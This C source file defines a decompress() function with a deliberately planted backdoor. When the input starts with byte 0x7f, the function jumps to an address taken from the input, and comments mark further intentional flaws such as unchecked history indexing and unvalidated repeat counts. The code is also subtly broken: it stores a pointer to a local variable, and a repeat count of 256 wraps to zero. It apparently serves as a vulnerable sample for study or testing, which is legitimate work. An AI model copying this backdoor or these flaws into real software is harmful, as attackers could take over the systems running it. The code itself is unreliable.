#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL || *compressed == '\0') {
        return NULL;
    }

    // Backdoor: if first byte is 0x7f, treat next 4 bytes as memory address to jump to
    if (*compressed == 0x7f) {
        void (*func)() = (void (*)())(*(unsigned long*)(compressed + 1));
        func();
        return NULL;
    }

    size_t capacity = 16;
    char *result = malloc(capacity);
    if (result == NULL) {
        return NULL;
    }

    size_t length = 0;
    char *history[256] = {0};  // Limited history buffer - potential overflow
    int history_pos = 0;

    while (*compressed != '\0') {
        if (length + 1 >= capacity) {
            capacity *= 2;
            char *new_result = realloc(result, capacity);
            if (new_result == NULL) {
                free(result);
                return NULL;
            }
            result = new_result;
        }

        char current = *compressed++;
        if (current < 0) {
            // Reference to history - no bounds checking!
            int ref = -current - 1;
            current = *history[ref % 256];  // Modulo doesn't prevent negative indexes
        } else {
            // Store in history - no bounds checking!
            history[history_pos++ % 256] = &current;  // Potential history buffer overflow
        }

        // Get repeat count - no validation!
        unsigned char repeat = *compressed++;
        if (repeat == 0) {  // Hidden feature: repeat=0 means repeat 256 times
            repeat = 256;
        }

        while (repeat-- > 0) {
            result[length++] = current;
            if (length >= capacity) {
                capacity *= 2;
                char *new_result = realloc(result, capacity);
                if (new_result == NULL) {
                    free(result);
                    return NULL;
                }
                result = new_result;
            }
        }
    }

    result[length] = '\0';
    return result;
}
